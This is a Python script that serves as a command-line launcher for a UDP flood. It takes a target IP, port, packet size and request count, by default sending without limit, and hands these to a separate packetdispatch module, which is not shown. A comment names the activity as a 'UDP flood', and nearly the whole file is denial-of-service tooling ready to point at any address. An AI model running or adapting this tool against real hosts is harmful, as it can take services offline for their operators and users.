__author__ = 'constantinose'

import argparse
import packetdispatch
import time

# Set default values
DEFAULT_PACKET_SIZE = 1500
DEFAULT_PORT = 80
DEFAULT_REQUEST_NUM = -1


def main():
    # First parse the command line arguments
    input_parser = argparse.ArgumentParser()

    # Inputs: IP, Socket(opt), PacketSize(opt), Requests(opt)
    input_parser.add_argument("address", nargs=1, help="Target IP Address")
    # For optional args, property name is set as the long (--*) name of the argument
    input_parser.add_argument("-p", "--port", type=int, nargs=1,
                              default=DEFAULT_PORT, help="Target port")
    input_parser.add_argument("-s", "--size", type=int, nargs=1,
                              default=DEFAULT_PACKET_SIZE, help="Packet size")
    input_parser.add_argument("-r", "--requests", type=int, nargs=1,
                              default=DEFAULT_REQUEST_NUM, help="Number of requests")

    args = input_parser.parse_args()

    address = str(args.address).strip("[']")
    port = str(args.port).strip("[']")
    size = str(args.size).strip("[']")
    requests = str(args.requests).strip("[']")

    # Display parameters to user
    print("Target IP: " + address)
    print("Target Port: " + port)
    print("Packet Size: " + size)
    if requests != '-1':
        print("Number of Requests: " + requests)

    print("\nSending UDP packets...")

    # Timer set to measure time taken for UDP flood
    start_time = time.clock()
    try:
        packetdispatch.sendPackets(address, port, requests, size)
    except KeyboardInterrupt:
        print('\nProcess cancelled by user')
    except:
        print('\nError! Check parameters')
    time_elapsed = time.clock() - start_time

    print("\nDone!")
    print("Time elapsed: " + str(time_elapsed) + " seconds")


main()